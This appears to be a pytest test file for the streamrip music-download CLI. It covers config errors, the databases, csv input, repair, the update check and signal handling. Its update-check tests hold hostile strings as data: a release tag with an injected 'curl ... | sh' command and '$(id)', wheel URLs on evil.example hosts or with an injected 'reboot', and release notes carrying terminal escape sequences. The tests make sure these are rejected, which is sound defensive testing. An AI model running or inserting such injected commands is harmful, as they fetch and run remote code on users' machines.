"""The `streamrip` command: its subcommands, update check, and how it stops."""

import asyncio
import json
import os
import re
import signal
import sys
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, Mock, PropertyMock, patch

import pytest
import tomlkit
from aiohttp import web
from click.testing import CliRunner

from streamrip import __version__, db
from streamrip.config import Config, set_user_defaults
from streamrip.console import console
from streamrip.exceptions import AccountHalt, AuthenticationError
from streamrip.media import PendingAlbum
from streamrip.rip import cli as cli_module
from streamrip.rip.cli import (
    _upgrade_command,
    coro,
    is_newer_version,
    latest_streamrip_version,
    rip,
)
from streamrip.rip.main import Main

posix_only = pytest.mark.skipif(
    os.name != "posix", reason="asyncio signal handlers only exist on POSIX"
)


@pytest.fixture
def cfg(tmp_path) -> str:
    path = tmp_path / "config.toml"
    set_user_defaults(path)
    return str(path)


def _rip(config, *args, **kwargs):
    """`streamrip --config-path config *args`."""
    return CliRunner().invoke(rip, ["--config-path", str(config), *args], **kwargs)


def _output(result, capsys) -> str:
    # Rich prints to Click's capture or to pytest's, depending on the run.
    captured = capsys.readouterr()
    return result.output + captured.out + captured.err


def _printed(result, capsys) -> str:
    """The output without whitespace, so Rich's line wrapping does not matter."""
    return "".join(_output(result, capsys).split())


class _FakeMain:
    """A Main that downloads nothing; its download step raises `to_raise`, if set."""

    added: list[str] = []
    to_raise: BaseException | None = None

    def __init__(self, _config):
        pass

    async def __aenter__(self):
        return self

    async def __aexit__(self, *_):
        pass

    async def add_all(self, urls):
        self.added.extend(urls)

    async def resolve(self):
        pass

    async def rip(self):
        if self.to_raise is not None:
            raise self.to_raise


@pytest.fixture
def fake_main(monkeypatch) -> type[_FakeMain]:
    _FakeMain.added, _FakeMain.to_raise = [], None
    monkeypatch.setattr("streamrip.rip.cli.Main", _FakeMain)
    return _FakeMain


# --- the config ---------------------------------------------------------------


def _break(cfg) -> str:
    """Make the config one that does not load: a Windows path in double quotes,
    whose backslashes TOML reads as escapes."""
    path = Path(cfg)
    windows = 'folder = "C:\\Users\\me\\Music"'
    path.write_text(re.sub(r"(?m)^folder = .*$", lambda _: windows, path.read_text()))
    return cfg


@pytest.mark.parametrize(
    "command",
    [
        ["url", "https://example"],
        ["csv", "{urls}", "--source", "tidal"],
        ["database", "browse", "downloads"],
    ],
    ids=lambda command: command[0],
)
def test_a_config_that_does_not_load_fails_the_command(cfg, tmp_path, capsys, command):
    # Exit 0 told scripts and cron that a run which did nothing had worked.
    urls = tmp_path / "urls.txt"
    urls.write_text("https://example\n")

    result = _rip(_break(cfg), *(arg.replace("{urls}", str(urls)) for arg in command))

    assert result.exit_code == 1, result.output
    assert "Errorloadingconfig" in _printed(result, capsys)


def test_a_config_that_does_not_load_can_still_be_reset(cfg, capsys):
    broken = Path(_break(cfg)).read_text()
    for command in (["config", "path"], ["config", "reset", "-y"]):
        result = _rip(cfg, *command)
        assert result.exit_code == 0, result.output

    # The line to fix, not a reset that throws every setting away; and a reset
    # keeps the old file.
    said = _printed(result, capsys)
    assert "Fixline15" in said
    assert "singlequotes" in said
    assert "configreset" not in said
    assert Path(f"{cfg}.bak").read_text() == broken
    Config(Path(cfg))  # loads now


def test_a_database_that_cannot_be_made_here_is_one_clear_error(cfg, tmp_path, capsys):
    # A config copied from another machine: its folder can't be made here.
    in_a_file = tmp_path / "a-file" / "downloads.db"
    in_a_file.parent.write_text("")
    path = Path(cfg)
    line = f'downloads_path = "{in_a_file}"'
    path.write_text(
        re.sub(r"(?m)^downloads_path = .*$", lambda _: line, path.read_text())
    )

    result = _rip(cfg, "database", "browse", "downloads")

    assert result.exit_code == 1
    said = _printed(result, capsys)
    assert "downloads_path" in said
    assert "Traceback" not in said


def test_config_path_prints_only_the_path_even_for_a_new_config(tmp_path):
    # Scripts read it; the notice that a config was created goes to stderr.
    cfg = tmp_path / "config.toml"
    result = _rip(cfg, "config", "path")
    assert result.exit_code == 0, result.output
    assert result.stdout == f"{cfg}\n"


# --- the databases ------------------------------------------------------------


@pytest.fixture
def seeded(cfg, tmp_path):
    """The config with its databases in tmp_path, holding two downloaded tracks
    and one failed download.
    """
    path = Path(cfg)
    doc = tomlkit.parse(path.read_text())
    doc["database"]["downloads_path"] = str(tmp_path / "downloads.db")
    doc["database"]["failed_downloads_path"] = str(tmp_path / "failed.db")
    path.write_text(tomlkit.dumps(doc))

    downloads = db.Downloads(str(tmp_path / "downloads.db"))
    failed = db.Failed(str(tmp_path / "failed.db"))
    for key in ("qobuz_1", "tidal_2"):
        downloads.add((key,))
    failed.add(("tidal", "track", "3"))
    return cfg, downloads, failed


@pytest.mark.parametrize(
    ("args", "answer", "left"),
    [
        (["downloads", "-y"], None, (0, 1)),
        (["all", "-y"], None, (0, 0)),
        (["downloads"], "n\n", (2, 1)),
    ],
    ids=["downloads", "all", "declined"],
)
def test_database_clear(seeded, args, answer, left):
    cfg, downloads, failed = seeded
    result = _rip(cfg, "database", "clear", *args, input=answer)
    assert result.exit_code == 0, result.output
    assert (len(downloads.all()), len(failed.all())) == left


def test_database_browse_failed_lines_up_with_its_headers(seeded, capsys):
    result = _rip(seeded[0], "database", "browse", "failed")
    assert result.exit_code == 0, result.output
    lines = _output(result, capsys).splitlines()
    header = next(line for line in lines if "Source" in line)
    row = next(line for line in lines if "tidal" in line)
    cells = dict(
        zip(
            [c.strip() for c in header.split("┃")[1:-1]],
            [c.strip() for c in row.split("│")[1:-1]],
            strict=True,
        )
    )
    assert cells == {"Row": "00", "Source": "tidal", "Media Type": "track", "ID": "3"}


def test_database_browse_downloads_shows_each_rows_source(seeded, capsys):
    cfg, downloads, _ = seeded
    downloads.add(("soundcloud_9",))

    result = _rip(cfg, "database", "browse", "downloads")

    assert result.exit_code == 0, result.output
    out = _printed(result, capsys)
    for source in ("qobuz", "tidal", "soundcloud"):
        assert source in out


# --- file and csv -------------------------------------------------------------


@pytest.mark.parametrize(
    ("content", "urls"),
    [
        (
            "https://c\nhttps://a\nhttps://c\nhttps://b\n",
            ["https://c", "https://a", "https://b"],  # repeats dropped, order kept
        ),
        ("﻿https://a\nhttps://b\n", ["https://a", "https://b"]),  # Notepad's BOM
    ],
    ids=["repeats", "BOM"],
)
def test_file_reads_a_list_of_urls(tmp_path, fake_main, content, urls):
    path = tmp_path / "urls.txt"
    path.write_text(content, encoding="utf-8")
    result = _rip(tmp_path / "config.toml", "file", str(path))
    assert result.exit_code == 0, result.output
    assert fake_main.added == urls


def test_a_json_file_with_half_an_item_says_what_is_missing(tmp_path, fake_main):
    path = tmp_path / "items.json"
    path.write_text('[{"source": "qobuz", "id": "1"}]', encoding="utf-8")
    result = _rip(tmp_path / "config.toml", "file", str(path))
    assert result.exit_code == 1
    assert "has no 'media_type'" in result.output


TRACKS_CSV = "title,artists,album\nGet Lucky,Daft Punk,Random Access Memories\n"


@pytest.fixture
def run(cfg):
    """Invoke `streamrip csv ...` with downloading and logging in left out."""
    calls = {}

    def invoke(*args):
        with (
            patch(
                "streamrip.utils.ffmpeg_utils.find_ffmpeg",
                return_value="/usr/bin/ffmpeg",
            ),
            patch.object(Main, "resolve_csv", AsyncMock()) as resolve,
            patch.object(Main, "rip", AsyncMock()) as download,
        ):
            result = _rip(cfg, *args)
        calls["resolve"], calls["rip"] = resolve, download
        return result

    invoke.calls = calls
    return invoke


@pytest.fixture
def tracks_csv(tmp_path):
    path = tmp_path / "road trip.csv"
    path.write_text(TRACKS_CSV)
    return str(path)


def test_the_tracks_are_searched_on_the_source_given(run, tracks_csv):
    result = run("csv", tracks_csv, "--source", "Tidal", "-fs", "qobuz")

    assert result.exit_code == 0, result.output
    run.calls["resolve"].assert_awaited_once()
    name, tracks, source, fallback = run.calls["resolve"].await_args.args
    assert name == "road trip"  # the file's name, without .csv
    assert [(t.title, t.artists) for t in tracks] == [("Get Lucky", ["Daft Punk"])]
    assert (source, fallback) == ("tidal", "qobuz")
    run.calls["rip"].assert_awaited_once()


def test_the_source_is_asked_when_it_is_left_out(run, tracks_csv, monkeypatch):
    monkeypatch.setattr(cli_module, "_ask_source", Mock(return_value="deezer"))

    result = run("csv", tracks_csv)

    assert result.exit_code == 0, result.output
    assert run.calls["resolve"].await_args.args[2] == "deezer"


def test_search_opens_no_menu_without_a_terminal(run, capsys):
    result = run("search", "tidal", "track", "x")  # CliRunner has no terminal
    assert result.exit_code == 2
    assert "needs a terminal" in _output(result, capsys)


@pytest.mark.parametrize(
    ("content", "source", "code", "said"),
    [
        ("", "tidal", 1, "No tracks found"),
        (b"title,artists\nCaf\xe9,Band\n", "tidal", 1, "not UTF-8 encoded"),
        (TRACKS_CSV, None, 2, "--source"),  # CliRunner has no terminal to ask on
    ],
    ids=["empty", "not utf-8", "no source"],
)
def test_a_csv_run_that_cannot_go_ahead_says_why(
    run, tmp_path, capsys, content, source, code, said
):
    path = tmp_path / "list.csv"
    path.write_bytes(content if isinstance(content, bytes) else content.encode())

    result = run("csv", str(path), *(["--source", source] if source else []))

    assert result.exit_code == code
    assert said in _output(result, capsys)
    run.calls["resolve"].assert_not_awaited()


def test_a_fallback_source_that_is_no_source_is_refused(run, tracks_csv):
    result = run("csv", tracks_csv, "--source", "tidal", "-fs", "tidal,nope")
    assert result.exit_code == 2
    assert "nope" in result.output


def test_preview_downloads_nothing(run, tracks_csv, monkeypatch):
    monkeypatch.setattr("streamrip.rip.options.show_plan", lambda main: None)
    result = run("csv", tracks_csv, "--source", "tidal", "--preview")
    assert result.exit_code == 0, result.output
    run.calls["rip"].assert_not_awaited()


# --- repair -------------------------------------------------------------------


class _RepairMain:
    """A Main whose retry downloads `downloaded`, marking them as the real one does."""

    downloaded: list[tuple[str, str]] = []
    downloads_at_rip: list = []
    media: list = []

    def __init__(self, config, interactive=True):
        c = config.session.database
        self.database = db.Database(
            db.Downloads(c.downloads_path) if c.downloads_enabled else db.Dummy(),
            db.Failed(c.failed_downloads_path),
        )

    async def __aenter__(self):
        return self

    async def __aexit__(self, *_):
        pass

    async def get_logged_in_client(self, _source):
        client = MagicMock()
        client.get_metadata = AsyncMock(side_effect=Exception("no album"))
        return client

    async def add_all_by_id(self, _items):
        pass

    async def resolve(self):
        pass

    async def rip(self):
        type(self).downloads_at_rip = self.database.downloads.all()
        for source, item_id in type(self).downloaded:
            self.database.set_downloaded(source, item_id)


def _repair(monkeypatch, cfg, downloaded):
    _RepairMain.downloaded = downloaded
    monkeypatch.setattr("streamrip.rip.repair.Main", _RepairMain)
    return _rip(cfg, "repair", "-y")


def test_repair_matches_failures_by_source_and_id(seeded, monkeypatch, capsys):
    cfg, downloads, failed = seeded
    failed.add(("qobuz", "track", "3"))  # the same id as the Tidal failure
    downloads.add(("tidal_3",))  # marked downloaded, though it failed

    result = _repair(monkeypatch, cfg, [("tidal", "3")])

    assert result.exit_code == 0, result.output
    # The stale row went before the retry, or the retry would be skipped.
    assert ("tidal_3",) not in _RepairMain.downloads_at_rip
    # Tidal 3 was repaired and Qobuz 3 was not: it stays for the next run.
    assert failed.all() == [("qobuz", "track", "3")]
    assert "Repaired1of2items." in _printed(result, capsys)


# --- the update check ---------------------------------------------------------


def test_version_comparison_is_numeric():
    assert is_newer_version("2.10.0", "2.9.9")
    assert is_newer_version("v2.4", "2.3.0")
    assert not is_newer_version("2.3.0", "2.3.0")
    assert not is_newer_version(None, "2.3.0")


GIT = "git+https://github.com/Stensel8/streamrip.git"
WHEEL = (
    "https://github.com/Stensel8/streamrip/releases/download/v2.4.5/"
    "streamrip-2.4.5-py3-none-any.whl"
)
UV_PIP = f'"/uv" pip install --python "{sys.executable}" --upgrade {GIT}@v2.4.5'
PIP = f'"{sys.executable}" -m pip install --upgrade {GIT}@v2.4.5'


@pytest.mark.parametrize(
    ("uv", "uv_tool", "kwargs", "command"),
    [
        ("/uv", False, {}, UV_PIP),
        (None, False, {}, PIP),
        ("/uv", True, {"wheel_url": WHEEL}, f'"/uv" tool install --upgrade "{WHEEL}"'),
        # A uv tool venv elsewhere is not the install in use: upgrade the Python
        # that is running.
        ("/uv", False, {"wheel_url": WHEEL}, UV_PIP),
    ],
    ids=["uv", "pip without uv", "the wheel in a uv tool install", "no wheel outside"],
)
def test_upgrade_command(monkeypatch, uv, uv_tool, kwargs, command):
    monkeypatch.setattr(cli_module.shutil, "which", lambda _: uv)
    monkeypatch.setattr(cli_module, "_is_uv_tool_install", lambda: uv_tool)
    assert _upgrade_command("2.4.5", **kwargs) == command


# The update notice asks the user to copy and run a command, and a release tag
# and wheel url come out of a response.


@pytest.mark.parametrize("tag", ["99.0.0;curl${IFS}https://x/i|sh", "$(id)9"])
def test_a_tag_that_is_no_version_is_no_newer_version(tag):
    assert not is_newer_version(tag, "2.3.0")


@pytest.mark.parametrize(
    "wheel",
    [
        "https://evil.example/streamrip-9.whl",
        "https://github.com.evil.example/Stensel8/streamrip/releases/download/v9/s.whl",
        WHEEL + '" ; reboot ; "',
    ],
)
def test_only_a_wheel_of_our_own_release_goes_into_the_command(monkeypatch, wheel):
    monkeypatch.setattr(cli_module.shutil, "which", lambda _: "/uv")
    monkeypatch.setattr(cli_module, "_is_uv_tool_install", lambda: True)
    assert _upgrade_command("2.4.5", wheel_url=wheel).endswith(f"{GIT}@v2.4.5")
    opencommit = WHEEL.replace("github.com", "opencommit.eu")
    assert opencommit in _upgrade_command("2.4.5", wheel_url=opencommit)


def test_release_notes_cannot_rewrite_the_terminal(monkeypatch, capsys):
    monkeypatch.setattr(cli_module.shutil, "which", lambda _: "/odd [/bold] path/uv")
    cli_module._print_update_notice(
        "9.9.9", "Fixes.\x1b[1A\x1b[2Kcurl x | sh\x1b]52;c;eA==\x07", is_release=True
    )
    shown = capsys.readouterr().err
    assert "\x1b" not in shown
    assert "\x07" not in shown
    assert "/odd [/bold] path/uv" in shown.replace("\n", "")  # a path is text too


async def test_the_update_check_gives_up_on_a_silent_network(monkeypatch):
    async def no_answer(*_):
        await asyncio.sleep(60)

    monkeypatch.setattr(cli_module, "UPDATE_CHECK_TIMEOUT", 0.05)
    monkeypatch.setattr(cli_module, "_latest_release", no_answer)
    monkeypatch.setattr(cli_module, "_default_branch_version", no_answer)

    version, *_ = await latest_streamrip_version()

    assert version == __version__


RELEASES = "/repos/x/x/releases/latest"


def _reply(**response):
    """A handler that answers every request with web.Response(**response)."""

    async def handler(_request):
        return web.Response(**response)

    return handler


def _release(tag: str, wheel: str | None = None) -> str:
    """A GitHub-shaped releases/latest answer, which opencommit.eu's is too."""
    assets = [{"name": wheel, "browser_download_url": f"https://dl/{wheel}"}]
    return json.dumps(
        {"tag_name": tag, "body": f"notes for {tag}", "assets": assets if wheel else []}
    )


def _source(host, base):
    """An update source on a local server; with no base, one where nothing answers."""
    if base is None:  # nothing listens on .test: the request fails outright
        return (host, f"http://unreachable.test/{host}", lambda path: path)
    return (host, f"{base}{RELEASES[1:]}", lambda path: f"{base}{path}")


@pytest.mark.parametrize(
    ("github", "opencommit", "found"),
    [
        (
            {RELEASES: _reply(text=_release("v9.0.0", "streamrip.whl"))},
            {},
            (
                "9.0.0",
                "notes for v9.0.0",
                True,
                "github.com",
                "https://dl/streamrip.whl",
            ),
        ),
        (
            None,
            {RELEASES: _reply(text=_release("v9.0.0"))},
            ("9.0.0", "notes for v9.0.0", True, "opencommit.eu", None),
        ),
        (None, None, (__version__, None, False, "github.com", None)),
    ],
    ids=["github first", "opencommit when github is down", "nothing answers"],
)
async def test_where_the_update_check_finds_the_latest_version(
    serve, monkeypatch, github, opencommit, found
):
    sources = []
    for host, routes in (("github.com", github), ("opencommit.eu", opencommit)):
        sources.append(_source(host, None if routes is None else await serve(routes)))
    monkeypatch.setattr(cli_module, "_UPDATE_SOURCES", tuple(sources))

    assert await latest_streamrip_version() == found


def test_a_failed_update_check_does_not_block_the_command(monkeypatch, capsys):
    check = AsyncMock(side_effect=RuntimeError("update check failed"))
    monkeypatch.setattr("streamrip.rip.cli.latest_streamrip_version", check)

    result = CliRunner().invoke(rip, ["--version"])

    assert result.exit_code == 0
    assert "version" in _output(result, capsys)
    check.assert_awaited_once()


def _update_check(monkeypatch) -> AsyncMock:
    check = AsyncMock(return_value=("99.0.0", None, True, "github.com", None))
    monkeypatch.setattr("streamrip.rip.cli.latest_streamrip_version", check)
    return check


def _no_update_check(cfg, value="true") -> str:
    """Set `no_update_check = value` in the config."""
    path = Path(cfg)
    path.write_text(
        path.read_text().replace(
            "# no_update_check = true", f"no_update_check = {value}"
        )
    )
    return cfg


@pytest.mark.parametrize(
    ("env", "setting", "checked"),
    [
        (None, None, True),
        ("1", None, False),
        ("0", None, True),
        (None, "true", False),
        (None, "false", True),
    ],
)
def test_what_turns_the_update_check_off(cfg, monkeypatch, env, setting, checked):
    check = _update_check(monkeypatch)
    if env is not None:
        monkeypatch.setenv("STREAMRIP_NO_UPDATE_CHECK", env)
    if setting is not None:
        _no_update_check(cfg, setting)

    result = _rip(cfg, "config", "path")

    assert result.exit_code == 0, result.output
    assert check.await_count == (1 if checked else 0)


def test_the_config_turns_the_check_off_for_version_too(cfg, monkeypatch):
    # --version never reaches the group's callback, where the config is loaded.
    check = _update_check(monkeypatch)
    result = _rip(_no_update_check(cfg), "--version")
    assert result.exit_code == 0, result.output
    check.assert_not_awaited()


@pytest.mark.parametrize(
    "content",
    [b"this is [not toml", 'folder = "Música"'.encode("cp1252")],
    ids=["not toml", "not utf-8"],
)
def test_a_config_that_cannot_be_read_does_not_turn_the_check_off(
    tmp_path, monkeypatch, capsys, content
):
    check = _update_check(monkeypatch)
    cfg = tmp_path / "config.toml"
    cfg.write_bytes(content)

    result = _rip(cfg, "config", "path")

    assert result.exception is None, result.exception
    assert "Errorloadingconfig" in _printed(result, capsys)
    check.assert_awaited_once()


@pytest.mark.parametrize(
    ("to_raise", "git"),
    [(None, True), (None, False), (asyncio.CancelledError(), True)],
    ids=["after a download", "without git", "after a cancelled download"],
)
def test_the_update_notice(tmp_path, monkeypatch, capsys, fake_main, to_raise, git):
    # Printed after the download so search's screen-clearing picker can't wipe it,
    # and in a finally: Ctrl-C during a download raises through there.
    _update_check(monkeypatch)
    fake_main.to_raise = to_raise
    monkeypatch.setattr(
        "streamrip.rip.cli.shutil.which",
        lambda name: "/usr/bin/git" if name == "git" and git else None,
    )

    result = _rip(tmp_path / "config.toml", "url", "https://example")

    assert result.exit_code == 0, result.output
    out = _printed(result, capsys)
    assert "v99.0.0" in out
    assert ("git-scm.com/downloads" in out) is not git
    if to_raise:
        assert "Stopped" in out


def test_no_update_notice_when_the_check_is_off(cfg, monkeypatch, capsys, fake_main):
    _update_check(monkeypatch)
    result = _rip(_no_update_check(cfg), "url", "https://example")
    assert result.exit_code == 0, result.output
    assert "v99.0.0" not in _printed(result, capsys)


# --- stopping: Ctrl-C, SIGTERM, errors and tracebacks -------------------------


def _exit_code(command):
    """The code `command` exits with, or None when it returns."""
    try:
        command()
    except SystemExit as e:
        return e.code
    return None


def _waiting_command(signum, seen, swallow=False):
    """A command that is sent `signum` while it waits; with `swallow`, it catches
    the cancellation, as a screen may.
    """

    @coro
    async def command():
        asyncio.get_running_loop().call_later(0.05, os.kill, os.getpid(), signum)
        try:
            await asyncio.sleep(30)
        except asyncio.CancelledError:
            if not swallow:
                raise
        finally:
            seen["cleaned_up"] = True
            # A second signal has to act as usual again.
            seen["sigterm"] = signal.getsignal(signal.SIGTERM)
            seen["sigint"] = signal.getsignal(signal.SIGINT)

    return command


@posix_only
@pytest.mark.parametrize(
    ("signum", "swallow", "code"),
    [
        (signal.SIGTERM, False, 128 + signal.SIGTERM),
        (signal.SIGTERM, True, 128 + signal.SIGTERM),
        (signal.SIGINT, False, 128 + signal.SIGINT),
    ],
    ids=["SIGTERM exits 143", "even when the command swallows it", "Ctrl-C exits 130"],
)
def test_a_signal_cancels_the_command_after_its_cleanup(signum, swallow, code):
    seen = {}
    assert _exit_code(_waiting_command(signum, seen, swallow)) == code
    assert seen["cleaned_up"]
    assert seen["sigterm"] is signal.SIG_DFL
    assert seen["sigint"] is signal.default_int_handler


@pytest.mark.parametrize(
    "error",
    [
        AuthenticationError("Tidal needs authorising again"),
        AccountHalt("Stopped to protect your account"),
    ],
)
def test_a_login_or_rate_limit_stop_is_a_message_not_a_traceback(error, capsys):
    @coro
    async def command():
        raise error

    assert _exit_code(command) == 1
    out = capsys.readouterr().out
    assert str(error) in out
    assert "Traceback" not in out


@pytest.fixture
def _restore_excepthook():
    saved = sys.excepthook
    yield
    sys.excepthook = saved


@pytest.mark.usefixtures("_restore_excepthook")
def test_a_traceback_does_not_print_local_variables(tmp_path):
    # Tracebacks get pasted into bug reports; under -v rich printed every
    # frame's locals, so a failed login showed the ARL.
    result = _rip(tmp_path / "config.toml", "-v", "config", "path")
    assert result.exit_code == 0, result.output

    def login(arl):
        raise RuntimeError("Deezer login failed")

    fake_arl = "f00dfeedc0ffee" * 8
    try:
        login(fake_arl)
    except RuntimeError:
        exc_info = sys.exc_info()

    with console.capture() as capture:
        sys.excepthook(*exc_info)
    out = capture.get()

    assert "Deezer login failed" in out
    assert fake_arl[:16] not in out


# --- Main: what a run reports -------------------------------------------------


@pytest.fixture
def mock_main():
    """A Main with mock clients and no databases."""
    config = MagicMock()
    config.session.downloads.requests_per_minute = 0
    config.session.database.downloads_enabled = False
    config.session.database.failed_downloads_enabled = False
    fakes = {
        s: MagicMock() for s in ("qobuz", "tidal", "deezer", "soundcloud", "spotify")
    }
    with patch("streamrip.rip.main.CLIENTS", fakes):
        yield Main(config)


def _main() -> Main:
    """A Main on the default config, with no databases."""
    config = Config.defaults()
    config.session.database.downloads_enabled = False
    config.session.database.failed_downloads_enabled = False
    return Main(config)


async def test_the_summary_of_a_run_counts_tracks_not_items(mock_main, caplog):
    # One artist is one item, but hundreds of tracks: say the latter.
    async def rip_discography():
        for n in range(40):
            mock_main.database.set_downloaded("qobuz", str(n))
        mock_main.database.set_failed("qobuz", "track", "rider")
        mock_main.database.skipped_now += 3

    mock_main.media = [MagicMock(rip=rip_discography)]

    await mock_main.rip()

    assert (
        "Download completed: 40 tracks downloaded, 3 already downloaded, 1 failed"
        in caplog.text
    )


async def test_one_item_that_fails_to_resolve_does_not_stop_the_others(mock_main):
    ok = MagicMock(resolve=AsyncMock(return_value="album"))
    broken = MagicMock(id="123", resolve=AsyncMock(side_effect=KeyError("tracks")))
    mock_main.pending = [broken, ok]

    await mock_main.resolve()

    assert mock_main.media == ["album"]


async def test_a_search_without_results_queues_nothing(mock_main):
    mock_main.clients["deezer"].search = AsyncMock(return_value=[{"data": []}])
    await mock_main.search_take_first("deezer", "track", "nothing matches")
    assert mock_main.pending == []


async def test_a_bad_url_costs_only_itself():
    # A tidal video can't be queued, and Rich reads "[/x]" as a markup tag:
    # each used to stop every url after it.
    main = _main()
    main.clients["tidal"].logged_in = True

    await main.add_all(
        [
            "[/x]",
            "https://tidal.com/browse/video/5678",
            "https://tidal.com/browse/album/1234",
        ]
    )

    assert [type(p) for p in main.pending] == [PendingAlbum]


async def test_a_source_is_announced_once_however_often_it_is_used():
    main = _main()
    for client in main.clients.values():
        client.logged_in = True

    with patch("streamrip.rip.main.console") as screen:
        for source in ("spotify", "spotify", "deezer", "qobuz", "deezer"):
            await main.get_logged_in_client(source)

    assert len(screen.print.call_args_list) == 1


@pytest.mark.parametrize(
    ("can_record", "says"), [(True, "Spotify's own"), (False, "from YouTube Music")]
)
async def test_the_spotify_notice_says_where_the_audio_really_comes_from(
    can_record, says
):
    # A container has the key in its config, but nothing to record with.
    main = _main()
    main.config.session.spotify.backend = "spotify"
    main.config.session.spotify.soloist_api_key = "key"
    main.clients["spotify"].logged_in = True

    with (
        patch("streamrip.rip.main.console") as screen,
        patch(
            "streamrip.client.soloist.SoloistBackend.supported",
            new_callable=PropertyMock,
            return_value=can_record,
        ),
    ):
        await main.get_logged_in_client("spotify")

    assert says in screen.print.call_args.args[0]


def test_pyproject_and_the_package_have_the_same_version():
    pyproject = (Path(__file__).parent.parent / "pyproject.toml").read_text("utf-8")
    m = re.search(r'^version\s*=\s*"([^"]+)"', pyproject, re.MULTILINE)
    assert m is not None
    assert m.group(1) == __version__
